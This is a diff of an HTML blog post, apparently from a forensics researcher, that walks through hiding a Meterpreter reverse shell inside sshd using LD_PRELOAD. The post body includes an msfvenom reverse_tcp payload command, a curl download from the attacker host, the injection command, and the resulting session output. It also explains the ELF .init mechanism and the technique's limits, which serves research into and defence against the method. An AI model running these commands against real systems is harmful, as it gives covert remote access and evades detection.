@@ -22,8 +22,8 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="referrer" content="no-referrer">
 <meta name="author" content="Tony Lambert">
-<meta name="description" content="Everyone has their favorite adversary technique to research and mine is LD_PRELOAD process injection because it&#39;s pretty versatile. It lets you hook functions to manipulate output, and it can also let you trip up defenders by injecting code into arbitrary processes for execution. In this post, I&#39;ll walk through how an adversary might combine Meterpreter with LD_PRELOAD to hide malicious activity under a legitimate Linux system process.
-The Setup To get started, I&#39;m working with a Kali Linux machine as my attacker system and a CentOS 8 system as my victim.">
+<meta name="description" content="Everyone has their favorite adversary technique to research and mine is LD_PRELOAD process injection because it&rsquo;s pretty versatile. It lets you hook functions to manipulate output, and it can also let you trip up defenders by injecting code into arbitrary processes for execution. In this post, I&rsquo;ll walk through how an adversary might combine Meterpreter with LD_PRELOAD to hide malicious activity under a legitimate Linux system process.
+The Setup To get started, I&rsquo;m working with a Kali Linux machine as my attacker system and a CentOS 8 system as my victim.">
 
 <script type="application/ld+json">
     {
@@ -36,7 +36,7 @@ The Setup To get started, I&#39;m working with a Kali Linux machine as my attack
         "articleSection" : "posts",
         "name" : "Linux EDR Evasion With Meterpreter and LD_PRELOAD",
         "headline" : "Linux EDR Evasion With Meterpreter and LD_PRELOAD",
-        "description" : "Everyone has their favorite adversary technique to research and mine is LD_PRELOAD process injection because it\x27s pretty versatile. It lets you hook functions to manipulate output, and it can also let you trip up defenders by injecting code into arbitrary processes for execution. In this post, I\x27ll walk through how an adversary might combine Meterpreter with LD_PRELOAD to hide malicious activity under a legitimate Linux system process.\nThe Setup To get started, I\x27m working with a Kali Linux machine as my attacker system and a CentOS 8 system as my victim.",
+        "description" : "Everyone has their favorite adversary technique to research and mine is LD_PRELOAD process injection because it\x26rsquo;s pretty versatile. It lets you hook functions to manipulate output, and it can also let you trip up defenders by injecting code into arbitrary processes for execution. In this post, I\x26rsquo;ll walk through how an adversary might combine Meterpreter with LD_PRELOAD to hide malicious activity under a legitimate Linux system process.\nThe Setup To get started, I\x26rsquo;m working with a Kali Linux machine as my attacker system and a CentOS 8 system as my victim.",
         "inLanguage" : "en-US",
         "author" : "Tony Lambert",
         "creator" : "Tony Lambert",
@@ -53,8 +53,8 @@ The Setup To get started, I&#39;m working with a Kali Linux machine as my attack
 </script>
 
 <meta property="og:title" content="Linux EDR Evasion With Meterpreter and LD_PRELOAD" />
-<meta property="og:description" content="Everyone has their favorite adversary technique to research and mine is LD_PRELOAD process injection because it&#39;s pretty versatile. It lets you hook functions to manipulate output, and it can also let you trip up defenders by injecting code into arbitrary processes for execution. In this post, I&#39;ll walk through how an adversary might combine Meterpreter with LD_PRELOAD to hide malicious activity under a legitimate Linux system process.
-The Setup To get started, I&#39;m working with a Kali Linux machine as my attacker system and a CentOS 8 system as my victim." />
+<meta property="og:description" content="Everyone has their favorite adversary technique to research and mine is LD_PRELOAD process injection because it&rsquo;s pretty versatile. It lets you hook functions to manipulate output, and it can also let you trip up defenders by injecting code into arbitrary processes for execution. In this post, I&rsquo;ll walk through how an adversary might combine Meterpreter with LD_PRELOAD to hide malicious activity under a legitimate Linux system process.
+The Setup To get started, I&rsquo;m working with a Kali Linux machine as my attacker system and a CentOS 8 system as my victim." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://forensicitguy.github.io/posts/linux-edr-evasion-with-ld-preload/" />
 <meta property="article:published_time" content="2020-02-06T16:06:16-06:00" />
@@ -85,6 +85,18 @@ The Setup To get started, I&#39;m working with a Kali Linux machine as my attack
       <a class="navbar-item" href="https://forensicitguy.github.io/tags/administrators/">
         
         Administrators
+        
+      </a>
+      
+      <a class="navbar-item" href="https://forensicitguy.github.io/tags/base64/">
+        
+        Base64
+        
+      </a>
+      
+      <a class="navbar-item" href="https://forensicitguy.github.io/tags/bash/">
+        
+        Bash
         
       </a>
       
@@ -139,6 +151,12 @@ The Setup To get started, I&#39;m working with a Kali Linux machine as my attack
       <a class="navbar-item" href="https://forensicitguy.github.io/tags/evasion/">
         
         Evasion
+        
+      </a>
+      
+      <a class="navbar-item" href="https://forensicitguy.github.io/tags/input/">
+        
+        Input
         
       </a>
       
@@ -208,6 +226,12 @@ The Setup To get started, I&#39;m working with a Kali Linux machine as my attack
         
       </a>
       
+      <a class="navbar-item" href="https://forensicitguy.github.io/tags/output/">
+        
+        Output
+        
+      </a>
+      
       <a class="navbar-item" href="https://forensicitguy.github.io/tags/package-manager/">
         
         Package manager
@@ -226,9 +250,21 @@ The Setup To get started, I&#39;m working with a Kali Linux machine as my attack
         
       </a>
       
+      <a class="navbar-item" href="https://forensicitguy.github.io/tags/piping/">
+        
+        Piping
+        
+      </a>
+      
       <a class="navbar-item" href="https://forensicitguy.github.io/tags/plugin/">
         
         Plugin
+        
+      </a>
+      
+      <a class="navbar-item" href="https://forensicitguy.github.io/tags/python/">
+        
+        Python
         
       </a>
       
@@ -247,6 +283,12 @@ The Setup To get started, I&#39;m working with a Kali Linux machine as my attack
       <a class="navbar-item" href="https://forensicitguy.github.io/tags/redhat/">
         
         Red hat
+        
+      </a>
+      
+      <a class="navbar-item" href="https://forensicitguy.github.io/tags/redirection/">
+        
+        Redirection
         
       </a>
       
@@ -298,19 +340,25 @@ The Setup To get started, I&#39;m working with a Kali Linux machine as my attack
       
       <a class="navbar-item" href="https://github.com/ForensicITGuy" rel="noopener" target="_blank">
         <span class="icon">
-          <img alt="github-circle" src='https://forensicitguy.github.io/icons/svg/github-circle.svg'>
+          
+            <img alt="icons/svg/github.svg" src='https://forensicitguy.github.io/icons/svg/github.svg'>
+          
         </span>
       </a>
       
       <a class="navbar-item" href="https://linkedin.com/in/tonymlambert" rel="noopener" target="_blank">
         <span class="icon">
-          <img alt="linkedin" src='https://forensicitguy.github.io/icons/svg/linkedin.svg'>
+          
+            <img alt="icons/svg/linkedin.svg" src='https://forensicitguy.github.io/icons/svg/linkedin.svg'>
+          
         </span>
       </a>
       
       <a class="navbar-item" href="https://twitter.com/ForensicITGuy" rel="noopener" target="_blank">
         <span class="icon">
-          <img alt="twitter" src='https://forensicitguy.github.io/icons/svg/twitter.svg'>
+          
+            <img alt="icons/svg/twitter.svg" src='https://forensicitguy.github.io/icons/svg/twitter.svg'>
+          
         </span>
       </a>
       
@@ -348,7 +396,7 @@ The Setup To get started, I&#39;m working with a Kali Linux machine as my attack
     
     
     
-    <a class="tag is-link" href="https://forensicitguy.github.io/tags/linux/">linux</a>
+    <a class="tag is-link" href="https://forensicitguy.github.io/tags/linux/">Linux</a>
     
     
     
@@ -375,9 +423,9 @@ The Setup To get started, I&#39;m working with a Kali Linux machine as my attack
 <section class="section">
   <div class="container">
 <div class="content is-medium">
-  <p>Everyone has their favorite adversary technique to research and mine is <code>LD_PRELOAD</code> process injection because it's pretty versatile. It lets you hook functions to manipulate output, and it can also let you trip up defenders by injecting code into arbitrary processes for execution. In this post, I'll walk through how an adversary might combine Meterpreter with <code>LD_PRELOAD</code> to hide malicious activity under a legitimate Linux system process.</p>
+  <p>Everyone has their favorite adversary technique to research and mine is LD_PRELOAD process injection because it&rsquo;s pretty versatile. It lets you hook functions to manipulate output, and it can also let you trip up defenders by injecting code into arbitrary processes for execution. In this post, I&rsquo;ll walk through how an adversary might combine Meterpreter with LD_PRELOAD to hide malicious activity under a legitimate Linux system process.</p>
 <h2 id="the-setup">The Setup</h2>
-<p>To get started, I'm working with a Kali Linux machine as my attacker system and a CentOS 8 system as my victim. You don't have to limit yourself to this setup, but it's what works for me at the moment.</p>
+<p>To get started, I&rsquo;m working with a Kali Linux machine as my attacker system and a CentOS 8 system as my victim. You don&rsquo;t have to limit yourself to this setup, but it&rsquo;s what works for me at the moment.</p>
 <p>On the victim system, the only access needed is code execution and the ability to transfer a payload.</p>
 <p>On my attacker machine, I need to generate a Meterpeter payload within a shared object library format. To do this, we can use <code>msfvenom</code>.</p>
 <pre><code># msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.57 LPORT=2022 -f elf-so &gt; meterpreter.so
@@ -399,13 +447,13 @@ The Setup To get started, I&#39;m working with a Kali Linux machine as my attack
 <h2 id="the-execution">The Execution</h2>
 <p>On my victim system, I downloaded the SO library using a simple <code>curl</code> command:</p>
 <pre><code>$ curl -O http://10.10.10.57/meterpreter.so
-</code></pre><p>From here I can pick any process I want to attribute execution to, as long as it isn't statically compiled. In this case, I'm choosing <code>sshd</code> since it often makes network connections and because some network admins use <code>tcp/2022</code> to obscure their SSH service availability.</p>
+</code></pre><p>From here I can pick any process I want to attribute execution to, as long as it isn&rsquo;t statically compiled. In this case, I&rsquo;m choosing <code>sshd</code> since it often makes network connections and because some network admins use <code>tcp/2022</code> to obscure their SSH service availability.</p>
 <pre><code>$ LD_PRELOAD=./meterpreter.so sshd
-</code></pre><p>Once executed, control is never actually passed to <code>sshd</code>, and the process execution is controlled by <code>meterpreter.so</code> as it reports back for commands. It appears that the process is frozen, but it really isn't.</p>
+</code></pre><p>Once executed, control is never actually passed to <code>sshd</code>, and the process execution is controlled by <code>meterpreter.so</code> as it reports back for commands. It appears that the process is frozen, but it really isn&rsquo;t.</p>
 <p>On the Kali machine I see:</p>
 <pre><code>[*] Sending stage (3021284 bytes) to 10.10.10.51
 [*] Meterpreter session 1 opened (10.10.10.57:2022 -&gt; 10.10.10.51:39314) at 2020-02-06 20:05:00 -0600
-</code></pre><p>From Kali I can join the Meterpreter session and get access at the permission level of the victim's user account:</p>
+</code></pre><p>From Kali I can join the Meterpreter session and get access at the permission level of the victim&rsquo;s user account:</p>
 <pre><code>meterpreter &gt; sysinfo
 Computer        : cent8-01.westeros.local
 OS              : CentOS 8.0.1905 (Linux 4.18.0-80.el8.x86_64)
@@ -417,10 +465,10 @@ Meterpreter     : x64/linux
 <p>Most of the time we can safely assume that SO libraries work in a similar fashion to DLLs on Windows. That is, the library must have an exported symbol that should be called for code to execute. We can inspect SO libraries for exported symbols using the <code>nm</code> command. Howver, when we inspect our generated <code>meterpreter.so</code> library we can notice something odd:</p>
 <pre><code># nm -D meterpreter.so
 nm: meterpreter.so: no symbols
-</code></pre><p>Oddly enough, it doesn't look like our <code>meterpreter.so</code> has any symbols to call, so how did <code>sshd</code> know to execute the code within the SO library? This is because of a feature of the ELF binary format.</p>
+</code></pre><p>Oddly enough, it doesn&rsquo;t look like our <code>meterpreter.so</code> has any symbols to call, so how did <code>sshd</code> know to execute the code within the SO library? This is because of a feature of the ELF binary format.</p>
 <p>SO libraries follow the ELF binary format and include a section called <code>.init</code>. Any code placed within this section will execute when the library is loaded by a process and before control is passed to the process itself. The section is usually used by compilers for global constructors, but we can put nearly anything there for exploitation. When <code>msfvenom</code> creates its <code>elf-so</code> payloads, it embeds payloads within a template designed to house the payload within the <code>.init</code> section for execution. That way, no process should need knowledge of symbols within the library for execution.</p>
 <p>This is also the way payloads generated/used by the <a href="https://github.com/dsnezhkov/zombieant">Zombie Ant Farm</a> project work.</p>
-<p>The use of a <code>.init</code> section also has an interesting limitation when combined with preloading- it can only be used effectively when you define <code>LD_PRELOAD</code> for a single process. When executing Meterpreter in this fashion, the victim process will appear hung. This is because the Meterpreter code continuously executes before control is passed to the victim process's main function. The rest of the process instructions will not execute until Meterpreter exits. This means that if you export <code>LD_PRELOAD</code> to leverage this SO library or write the library path into <code>ld.so.preload</code>, it will cause serious instability. If you use a preload method that causes <code>meterpreter.so</code> to load into numerous or all processes, it will cause loads of processes, even ones needed for system operation, to hang immediately after loading the SO library. So, no bueno.</p>
+<p>The use of a <code>.init</code> section also has an interesting limitation when combined with preloading- it can only be used effectively when you define <code>LD_PRELOAD</code> for a single process. When executing Meterpreter in this fashion, the victim process will appear hung. This is because the Meterpreter code continuously executes before control is passed to the victim process&rsquo;s main function. The rest of the process instructions will not execute until Meterpreter exits. This means that if you export <code>LD_PRELOAD</code> to leverage this SO library or write the library path into <code>ld.so.preload</code>, it will cause serious instability. If you use a preload method that causes <code>meterpreter.so</code> to load into numerous or all processes, it will cause loads of processes, even ones needed for system operation, to hang immediately after loading the SO library. So, no bueno.</p>
 <h2 id="is-it-useful">Is It Useful?</h2>
 <p>Eh, it depends. We obviously already need code execution and a method of downloading code to a victim for this to be possible. I could see this being useful when combined with an RCE against publicly-available services to get a stable shell. That said, a simpler and safer route in terms of stability could also be the execution of a Python C2 agent. In the case of a Python agent, it would be slightly harder to cause the attribution of activity to a system process. This is not going to be an initial access method, it would be more useful for long-term evasion and persistence when combined with a <code>.bash_profile</code> or <code>.bashrc</code> command execution.</p>
 
